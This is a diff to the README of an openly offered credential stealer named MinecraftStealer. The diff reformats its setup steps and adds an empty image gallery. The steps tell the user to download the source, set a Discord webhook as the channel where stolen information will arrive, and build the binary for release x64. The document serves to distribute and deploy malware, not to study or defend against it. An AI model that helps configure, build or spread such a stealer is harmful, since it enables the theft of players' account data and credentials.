@@ -49,11 +49,24 @@ Discord webhook
     (change the channel where the information will arrive if you wish)
  
 # Setup
-- 1. [Download source code] (https://github.com/zjuvee/MinecraftStealer/archive/refs/heads/main.zip)
-- 2. Extract it
-- 3. Open the solution
-- 4. Open MinecraftStealer header and change the webhook with the format that specifies it
-- 5. Go to project properties
-- 6. `Configuration properties -> General -> C++ Language Standard` change this to C++ 20 and done
-- 7. Finally put it in `release` and `x64`
-- 8. Build it!
+ 1. [Download source code] (https://github.com/zjuvee/MinecraftStealer/archive/refs/heads/main.zip)
+ 2. Extract it
+ 3. Open the solution
+ 4. Open MinecraftStealer header and change the webhook with the format that specifies it
+ 5. Go to project properties
+ 6. `Configuration properties -> General -> C++ Language Standard` change this to C++ 20 and done
+ 7. Finally put it in `release` and `x64`
+ 8. Build it!
+
+# Images
+
+<div align="center">
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src=""></img>
+    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%">    
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src=""></img>
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src=""></img>
+  <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src=""></img>
+    <hr style="border-radius: 2%; margin-top: 60px; margin-bottom: 60px;" noshade="" size="20" width="75%"> 
+    <img style="border-radius: 15px; display: block; margin-left: auto; margin-right: auto; margin-bottom:20px;" width="70%" src=""></img>
+  
+</div>
